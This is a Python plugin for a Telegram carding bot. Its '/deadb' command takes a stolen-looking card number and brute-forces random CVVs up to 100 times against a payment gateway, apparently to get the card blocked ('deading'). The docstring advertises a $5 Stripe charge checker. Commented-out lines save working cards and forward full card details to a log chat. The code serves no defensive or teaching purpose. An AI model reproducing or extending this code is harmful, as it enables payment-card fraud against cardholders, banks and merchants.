"""
≛ <b>Commands Available</b> ≛

──────────────────────
- <code>/chk</code> cc cvv mes ano || <reply_to_msg>.
➛ Stripe Charge $5.
──────────────────────

© <a href="https://t.me/TakashiKovace">TakeshiKovace</a>
"""


import time
from time import gmtime, strftime
from telethon import Button
from mills import LOG_CHAT

from mills.decorators import bot_cmd
from mills.plugins.checkers.utils.gateinfo import get_gate_info
from mills.plugins import rand_user_base
from mills.plugins.checkers.utils.getcards  import get_cards
from mills.plugins._helpers.strings import get_strings
from mills.plugins.checkers.funcs.deadb_defs import deadb_three, random_cvv_date_exp, get_response_progress


@bot_cmd(cmd="deadb", text_only = True)
@get_gate_info("deadb")
@get_cards()
@get_strings("card_deadb")
async def _(m, gate_db, user_db, cards, lang):
    
    dead_dict = {
        '_id': m.message.id,
        'status': True,
        'status_logo': '✅',
        'made_by_id': m.sender_id,
        'made_by_name': m.full_name(),
        'date': strftime("%Y-%m-%d", gmtime())
    }
    
    await m.mdb.insert_one('deadJob',  dead_dict)
    
    start_time = int(time.time())
    cc,mes,ano,cvv, bin_info = cards
    countTrys = 1
    progressBar = get_response_progress(0)
    message = await m.reply(lang['trys_msg'].format(
        gate_name=gate_db['gate_name'],
        name=m.full_name(),
        id=m.sender_id,
        progress=progressBar,
        trys=countTrys,
        response='Starting...',
        taken=int(time.time()) - start_time,
    ))
    
    
    while countTrys < 100:
        
        cvvRand = random_cvv_date_exp(3)
        
        res = deadb_three(message, cc, mes, ano, cvvRand)
        
        if 'error' in res:
            if countTrys in [10,20,30,40,50,60,70,80,90,100]:
                progressBar = get_response_progress(countTrys)
            
            dead_job = await m.mdb.find_one('deadJob',  m.message.id)
            
            if dead_job['status'] == True:
                await message.edit(lang['trys_msg'].format(
                        gate_name=gate_db['gate_name'],
                        name=m.full_name(),
                        id=m.sender_id,
                        progress=progressBar,
                        trys=countTrys,
                        response=res.get('error'),
                        taken=int(time.time()) - start_time,
                    ), buttons= [
                         Button.inline("close", data=f"deadClose_{m.message.id}")
                    ])
            else:
                await message.edit(lang['trys_msg'].format(
                        gate_name=gate_db['gate_name'],
                        name=m.full_name(),
                        id=m.sender_id,
                        progress='Deading Completed ✅',
                        trys=countTrys,
                        taken=int(time.time()) - start_time,
                    ))
                break
                
        else:
            await message.edit("Error while deading your card. trying again....")
            
        countTrys += 1
        
    r_text, r_logo, r_respo = "Deading", "✅", 'Completed'    
    
    await message.edit(lang['fin_msg'].format(
        gate_name = gate_db['gate_name'],
        card = f"{cc}|{mes}|{ano}|{cvv}",
        status = r_respo,
        logo = r_logo,
        message = r_text,
        vendor = bin_info['vendor'],
        type = bin_info['type'],
        bank_name = bin_info['bank_name'],
        country = bin_info['iso'],
        flag = bin_info['flag'],
        name = m.full_name(),
        id = m.sender_id,
        role = user_db['role'],
        taken = int(time.time()) - start_time,
    ), link_preview = False, parse_mode = 'html')
    
    # if r_respo == "CVV MATCH":
    #     if user_db['saveccs']:
    #         await m.mdb.update_one('users',{'_id': m.sender_id}, {'$addToSet': {'lives': f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}"}})
    #     m.save_lives(f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    #     await m.client.send_message(LOG_CHAT, f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    await m.adb.set_key(f'antispam_{str(m.sender_id)}', time.time())
    return